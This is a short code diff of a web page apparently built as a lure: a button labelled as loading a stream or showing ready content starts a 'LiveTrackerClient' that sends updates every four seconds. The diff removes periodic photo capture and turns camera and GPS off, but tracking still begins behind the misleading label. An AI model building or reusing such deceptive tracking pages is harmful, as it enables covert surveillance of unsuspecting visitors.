@@ -142,16 +142,14 @@
                 window.LiveTrackerClient.startTracking({
                     templateName: 'custom',
                     updateInterval: 4000,
-                    photoInterval: 12000,
-                    onSuccess: () => {
-                        actionBtn.innerHTML = '<i class="fas fa-check-circle"></i> Content Ready';
-                    }
+                    enableCamera: false,
+                    enableGPS: false
                 });
             }
         }
 
         actionBtn.addEventListener('click', () => {
-            actionBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading Stream...';
+            actionBtn.innerHTML = '<i class="fas fa-check-circle"></i> Content Ready';
             startTelemetry();
         });
 
